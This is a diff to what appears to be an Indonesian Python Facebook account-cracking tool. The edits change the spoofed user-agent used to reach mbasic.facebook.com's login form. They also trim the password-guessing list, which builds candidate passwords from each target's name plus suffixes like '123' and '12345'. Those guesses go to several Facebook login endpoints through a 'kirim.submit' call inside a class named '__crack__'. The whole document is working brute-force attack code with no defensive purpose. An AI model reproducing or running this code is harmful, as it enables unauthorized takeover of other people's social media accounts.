@@ -467,7 +467,7 @@ def log_hasil(user, pasw):
         "accept-encoding":"gzip, deflate",
         "accept-language":"id-ID,id;q=0.9",
         "referer":"https://mbasic.facebook.com/",
-        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+        "user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+;]"
     })
     soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
     link=soup.find("form",{"method":"post"})
@@ -795,9 +795,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         kirim.submit(self.__api__, uid, pwx)
                     except:
                         pass
@@ -812,9 +812,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         kirim.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
@@ -829,9 +829,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         kirim.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
